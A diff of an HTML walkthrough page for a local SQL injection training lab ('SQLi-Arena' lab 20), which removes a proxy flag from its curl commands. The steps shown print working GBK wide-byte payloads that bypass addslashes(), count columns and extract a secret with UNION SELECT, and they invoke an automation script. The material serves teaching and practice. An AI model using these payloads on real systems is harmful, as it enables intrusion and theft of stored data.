@@ -11,7 +11,7 @@
         <span class="terminal-title">Step 1. Normal Lookup</span>
     </div>
     <div class="terminal-body">
-        <span class="prompt">$ </span>curl -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/mysql/lab20" -d "username=admin"<br><br>
+        <span class="prompt">$ </span>curl "http://localhost/SQLi-Arena/mysql/lab20" -d "username=admin"<br><br>
         <span class="prompt">Input: </span>admin<br><br>
         <span class="prompt">Query: </span>SELECT username, email FROM users WHERE username = 'admin'<br><br>
         <span class="prompt">Result: </span>Username: admin | Email: admin@corp.local
@@ -32,7 +32,7 @@
         <span class="terminal-title">Step 2: addslashes() in Action</span>
     </div>
     <div class="terminal-body">
-        <span class="prompt">$ </span>curl -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/mysql/lab20" -d "username=admin%27"<br><br>
+        <span class="prompt">$ </span>curl "http://localhost/SQLi-Arena/mysql/lab20" -d "username=admin%27"<br><br>
         <span class="prompt">Input: </span>admin'<br>
         <span class="prompt">After addslashes: </span>admin\'<br>
         <span class="prompt">Raw bytes (input): </span>0x61 0x64 0x6D 0x69 0x6E 0x27<br>
@@ -81,7 +81,7 @@
         <span class="terminal-title">Step 4. Test Wide-Byte with curl</span>
     </div>
     <div class="terminal-body">
-        <span class="prompt">$ </span>curl -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/mysql/lab20" -d "username=%bf%27+OR+1%3D1+--+-"<br><br>
+        <span class="prompt">$ </span>curl "http://localhost/SQLi-Arena/mysql/lab20" -d "username=%bf%27+OR+1%3D1+--+-"<br><br>
         <span class="prompt">Bytes sent: </span>0xBF 0x27 0x20 0x4F 0x52 0x20 0x31 0x3D 0x31 0x20 0x2D 0x2D 0x20 0x2D<br>
         <span class="prompt">addslashes: </span>0xBF 0x5C 0x27 0x20 0x4F 0x52 0x20 0x31 0x3D 0x31 0x20 0x2D 0x2D 0x20 0x2D<br>
         <span class="prompt">MySQL sees: </span>[GBK_char: 0xBF5C]' OR 1=1 -- -<br><br>
@@ -103,9 +103,9 @@
         <span class="terminal-title">Step 5. Column Count</span>
     </div>
     <div class="terminal-body">
-        <span class="prompt">$ </span>curl -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/mysql/lab20" -d "username=%bf%27+ORDER+BY+2+--+-"<br>
+        <span class="prompt">$ </span>curl "http://localhost/SQLi-Arena/mysql/lab20" -d "username=%bf%27+ORDER+BY+2+--+-"<br>
         <span class="prompt">Result: </span>No error &rarr; 2 or more columns<br><br>
-        <span class="prompt">$ </span>curl -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/mysql/lab20" -d "username=%bf%27+ORDER+BY+3+--+-"<br>
+        <span class="prompt">$ </span>curl "http://localhost/SQLi-Arena/mysql/lab20" -d "username=%bf%27+ORDER+BY+3+--+-"<br>
         <span class="prompt">Result: </span>Unknown column '3' in 'ORDER BY' &rarr; Query has <strong>2 columns</strong>
     </div>
 </div>
@@ -123,7 +123,7 @@
         <span class="terminal-title">Step 6. Extract the Flag</span>
     </div>
     <div class="terminal-body">
-        <span class="prompt">$ </span>curl -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/mysql/lab20" -d "username=%bf%27+UNION+SELECT+secret%2C2+FROM+secret_data+--+-"<br><br>
+        <span class="prompt">$ </span>curl "http://localhost/SQLi-Arena/mysql/lab20" -d "username=%bf%27+UNION+SELECT+secret%2C2+FROM+secret_data+--+-"<br><br>
         <span class="prompt">Bytes sent: </span>0xBF 0x27 0x20 0x55 0x4E 0x49 0x4F 0x4E 0x20 0x53 0x45 0x4C 0x45 0x43 0x54 ...<br>
         <span class="prompt">addslashes: </span>0xBF 0x5C 0x27 ... (backslash at 0x5C consumed by GBK as part of 0xBF5C)<br><br>
         <span class="prompt">Query: </span>SELECT username, email FROM users WHERE username = '[GBK:0xBF5C]' UNION SELECT secret,2 FROM secret_data -- -'<br><br>
@@ -154,7 +154,7 @@
         <span class="terminal-title">Step 8. Python Automation (lab20_gbk_widebyte.py)</span>
     </div>
     <div class="terminal-body">
-        <span class="prompt">$ </span>python3 scripts/lab20_gbk_widebyte.py http://localhost/SQLi-Arena/<br><br>
+        <span class="prompt">$ </span>python3 scripts/lab20_gbk_widebyte.py http://localhost/SQLi-Arena<br><br>
         <span class="prompt">[*] </span>Attack: GBK wide-byte to bypass addslashes()<br>
         <span class="prompt">[*] </span>How it works:<br>
         <span class="prompt">&nbsp;&nbsp;</span>Input:       0xBF 0x27           (0xBF + single quote)<br>
